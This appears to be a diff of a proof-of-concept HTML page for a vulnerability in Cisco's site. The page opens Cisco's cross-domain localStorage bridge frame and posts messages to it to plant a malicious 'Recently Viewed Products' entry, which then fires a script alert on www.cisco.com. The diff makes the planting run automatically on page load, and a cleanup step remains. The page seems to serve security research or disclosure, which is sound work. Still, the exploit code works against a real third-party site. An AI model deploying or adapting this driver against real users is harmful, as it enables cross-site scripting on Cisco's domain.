@@ -61,24 +61,31 @@
       history. Use the cleanup button when finished.
     </p>
     <ol>
-      <li>Click <strong>Plant alert entry</strong> and allow the popup.</li>
+      <li>
+        This page automatically attempts to plant the alert entry. Allow the
+        popup if the browser asks.
+      </li>
+      <li>
+        If the browser blocks the automatic popup, allow popups and use the
+        retry button that appears.
+      </li>
       <li>After the status says the entry was planted, open Cisco Support.</li>
       <li>Under Recently Viewed Products, click the planted PoC entry.</li>
       <li>The dialog should display <strong>www.cisco.com</strong>.</li>
     </ol>
     <p>
-      <button id="plant">1. Plant alert entry</button>
+      <button id="plant" hidden>Retry planting</button>
       <a
         class="button"
         href="https://www.cisco.com/c/en/us/support/index.html"
         target="_blank"
         rel="noopener"
       >
-        2. Open Cisco Support
+        Open Cisco Support
       </a>
       <button class="secondary" id="cleanup">Remove PoC entry</button>
     </p>
-    <pre id="status">Ready. Current origin: </pre>
+    <pre id="status">Preparing automatic planting attempt...</pre>
 
     <script>
       const BRIDGE_URL = "https://www.cisco.com/assets/ctm/xdc/xdcLsFrame.html";
@@ -90,6 +97,7 @@
         },
       ];
       const status = document.getElementById("status");
+      const plantButton = document.getElementById("plant");
 
       function bridgeMessage(action) {
         return JSON.stringify({
@@ -105,10 +113,13 @@
         const bridge = window.open(BRIDGE_URL, "cisco-xdc-poc");
         if (!bridge) {
           status.textContent =
-            "Popup blocked. Allow popups for this site and retry.";
+            "Automatic planting was blocked by the browser. " +
+            "Allow popups for this site, then click Retry planting.";
+          plantButton.hidden = false;
           return;
         }
 
+        plantButton.hidden = true;
         const payload = bridgeMessage(action);
         let posts = 0;
         const timer = setInterval(() => {
@@ -133,13 +144,12 @@
         }, 6000);
       }
 
-      status.textContent += location.origin;
-      document
-        .getElementById("plant")
-        .addEventListener("click", () => drive("set"));
+      plantButton.addEventListener("click", () => drive("set"));
       document
         .getElementById("cleanup")
         .addEventListener("click", () => drive("remove"));
+      status.textContent = `Automatically planting from ${location.origin}...`;
+      drive("set");
     </script>
   </body>
 </html>
